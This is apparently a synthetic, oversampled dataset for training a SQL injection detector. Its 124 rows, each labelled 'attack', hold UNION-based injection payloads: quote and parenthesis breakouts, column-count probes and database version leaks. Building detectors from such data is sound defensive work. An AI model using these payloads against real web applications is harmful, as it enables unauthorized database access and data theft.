id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000520,0.4432420631215733
SMOTE_000002,attack,union,"1'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000726,0.37668839457818826
SMOTE_000003,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000386,0.2337247584523798
SMOTE_000004,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000584,0.3178804062309823
SMOTE_000005,attack,union,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",nearest_attack_euclidean,R000321,0.07466438297528112
SMOTE_000006,attack,union,"-8923'+  (  select xgvz where 9858  =  9858 union all select 9858,9858,9858#",nearest_attack_euclidean,R000626,0.5044545615695364
SMOTE_000007,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000246,0.19233393707357221
SMOTE_000008,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000498,0.7897491631346895
SMOTE_000009,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000050,0.30986225614648855
SMOTE_000010,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000765,0.3464392962932199
SMOTE_000011,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.0746920984100946
SMOTE_000012,attack,union,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",nearest_attack_euclidean,R000282,0.1038008353548933
SMOTE_000013,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,0.15545855208262616
SMOTE_000014,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000223,0.14137275926334356
SMOTE_000015,attack,union,-4331  )   as inpx where 9804  =  9804 union all select 9804#,nearest_attack_euclidean,R000329,0.2576917526965755
SMOTE_000016,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000607,0.023380373899574793
SMOTE_000017,attack,union,"-4694'  )   where 1501  =  1501 union all select 1501,1501,1501,1501,1501,1501#",nearest_attack_euclidean,R000718,0.5573101862374871
SMOTE_000018,attack,union," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000031,0.02262812077595638
SMOTE_000019,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R000579,0.4519749658685305
SMOTE_000020,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000396,0.5885699579779888
SMOTE_000021,attack,union," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000007,0.2995472779099395
SMOTE_000022,attack,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",nearest_attack_euclidean,R000732,0.1506249844662049
SMOTE_000023,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,0.3852300683141106
SMOTE_000024,attack,union,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",nearest_attack_euclidean,R000768,0.20077881443617326
SMOTE_000025,attack,union,"1%'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000660,0.10898580230335463
SMOTE_000026,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000088,0.3107210424512181
SMOTE_000027,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000598,0.7938581789145781
SMOTE_000028,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000591,0.7548804719101269
SMOTE_000029,attack,union,"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",nearest_attack_euclidean,R000307,0.49710910096377126
SMOTE_000030,attack,union,"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",nearest_attack_euclidean,R000702,0.06929121643392432
SMOTE_000031,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000178,0.4018777967744069
SMOTE_000032,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000309,0.30732347204449784
SMOTE_000033,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000609,0.035594006874358305
SMOTE_000034,attack,union,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000265,1.0037581309652215
SMOTE_000035,attack,union,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",nearest_attack_euclidean,R000135,0.4268035347844654
SMOTE_000036,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,0.0977734646080333
SMOTE_000037,attack,union,"1   )    )    as queb where 2449  =  2449 union all select null,null#",nearest_attack_euclidean,R000779,0.43382915182681586
SMOTE_000038,attack,union,"1%""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000727,0.3329266254018478
SMOTE_000039,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000610,0.22638854313659265
SMOTE_000040,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R000288,0.295005369069908
SMOTE_000041,attack,union,-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,nearest_attack_euclidean,R000689,0.6757977772416984
SMOTE_000042,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R000388,0.3594846636183725
SMOTE_000043,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000218,0.3911205259202276
SMOTE_000044,attack,union,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",nearest_attack_euclidean,R000282,0.20973102726496845
SMOTE_000045,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,0.9614614200076893
SMOTE_000046,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000554,0.42136069665506404
SMOTE_000047,attack,union,"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000753,1.266662522641803
SMOTE_000048,attack,union,"-1408   )    )    union all select 5715,5715,5715,5715,5715,5715--",nearest_attack_euclidean,R000374,0.46940069680806357
SMOTE_000049,attack,union,"1%'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000377,0.3116438832059105
SMOTE_000050,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000087,0.5801594412007178
SMOTE_000051,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000060,0.06577774459551189
SMOTE_000052,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000097,0.7803721436274669
SMOTE_000053,attack,union,"-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",nearest_attack_euclidean,R000504,0.004247010856297441
SMOTE_000054,attack,union,"-1447"" union all select 3013,3013,3013,3013,3013,3013,3013--",nearest_attack_euclidean,R000588,0.01813157983338826
SMOTE_000055,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000241,0.06389959638880384
SMOTE_000056,attack,union,"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",nearest_attack_euclidean,R000610,0.22539293692249382
SMOTE_000057,attack,union,"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000511,0.06905976481778599
SMOTE_000058,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000034,0.31344838102046413
SMOTE_000059,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000209,1.0905476735411532
SMOTE_000060,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000617,0.45921251704473964
SMOTE_000061,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000269,0.18614348886728127
SMOTE_000062,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000106,0.0130559724751859
SMOTE_000063,attack,union,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",nearest_attack_euclidean,R000116,0.009141856225018648
SMOTE_000064,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.0061685578647577965
SMOTE_000065,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000489,0.4435073748347489
SMOTE_000066,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,0.17970681620698745
SMOTE_000067,attack,union,"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",nearest_attack_euclidean,R000437,0.44082243624424505
SMOTE_000068,attack,union,"1  )   where 3915  =  3915 union all select null,null,null,null#",nearest_attack_euclidean,R000627,0.6974617536099804
SMOTE_000069,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000008,1.3941864782280378
SMOTE_000070,attack,union,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",nearest_attack_euclidean,R000191,0.5292626152081671
SMOTE_000071,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.20773537078017115
SMOTE_000072,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R000562,0.19785111470674616
SMOTE_000073,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,0.6411734709774676
SMOTE_000074,attack,union," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000065,0.08339078138535952
SMOTE_000075,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000158,0.4594021102754483
SMOTE_000076,attack,union," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",nearest_attack_euclidean,R000091,1.184656929348091
SMOTE_000077,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,2.384185791015625e-07
SMOTE_000078,attack,union,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",nearest_attack_euclidean,R000176,0.1388667337474266
SMOTE_000079,attack,union,"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",nearest_attack_euclidean,R000418,0.3221884198328421
SMOTE_000080,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000558,0.38510055613169963
SMOTE_000081,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000576,0.29419288243347164
SMOTE_000082,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R000711,0.054062513069033216
SMOTE_000083,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000489,0.4465823315582428
SMOTE_000084,attack,union,"1' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000616,0.36628368719966187
SMOTE_000085,attack,union,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",nearest_attack_euclidean,R000317,0.728559405768441
SMOTE_000086,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000633,0.3405590509781796
SMOTE_000087,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000109,1.2581919638311823
SMOTE_000088,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000233,0.6399627036146057
SMOTE_000089,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000182,0.4517592517951218
SMOTE_000090,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000413,1.9656731948195942
SMOTE_000091,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000631,0.42440715604682444
SMOTE_000092,attack,union," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000076,0.12514744957732907
SMOTE_000093,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000347,0.43788128413018845
SMOTE_000094,attack,union,"1%'   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000595,0.40037087742325356
SMOTE_000095,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R000657,0.13150955999825353
SMOTE_000096,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000308,0.08661956538662131
SMOTE_000097,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000246,0.2314898915199444
SMOTE_000098,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000013,0.10165529951273815
SMOTE_000099,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R000393,1.1178380209116137
SMOTE_000100,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000120,0.12366985335868971
SMOTE_000101,attack,union,"-9923%'   )    )     )   union all select 8985,8985,8985,8985,8985,8985,8985#",nearest_attack_euclidean,R000517,0.7587709845662131
SMOTE_000102,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000419,0.25757446902402387
SMOTE_000103,attack,union," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",nearest_attack_euclidean,R000004,0.7610915163130325
SMOTE_000104,attack,union,"-3013'  )   where 2027  =  2027 union all select 2027,2027,2027,2027--",nearest_attack_euclidean,R000492,0.15921449757865058
SMOTE_000105,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000064,0.2178510007182683
SMOTE_000106,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000546,1.482676691177528
SMOTE_000107,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000189,0.497089431185635
SMOTE_000108,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000360,0.5411100613506371
SMOTE_000109,attack,union,"1""   )    )    as etap where 8506  =  8506 union all select null,null,null,null#",nearest_attack_euclidean,R000701,1.1964845015470813
SMOTE_000110,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000228,0.220429316734427
SMOTE_000111,attack,union,"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",nearest_attack_euclidean,R000711,0.028513860220499974
SMOTE_000112,attack,union,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",nearest_attack_euclidean,R000688,0.17509354741377975
SMOTE_000113,attack,union,"1"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000600,1.3653652061487334
SMOTE_000114,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000204,0.16946370750060735
SMOTE_000115,attack,union,"1""  )   as ivkw where 4218  =  4218 union all select null--",nearest_attack_euclidean,R000445,0.4710831416953304
SMOTE_000116,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000551,1.180923118098627
SMOTE_000117,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000257,0.011108411725629411
SMOTE_000118,attack,union," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",nearest_attack_euclidean,R000009,0.39981759517263504
SMOTE_000119,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000547,0.4942505700370045
SMOTE_000120,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000772,0.17932286808362172
SMOTE_000121,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000080,0.2856946261413412
SMOTE_000122,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,0.014929120663644933
SMOTE_000123,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000021,1.029869719554206
SMOTE_000124,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.4457266090336275
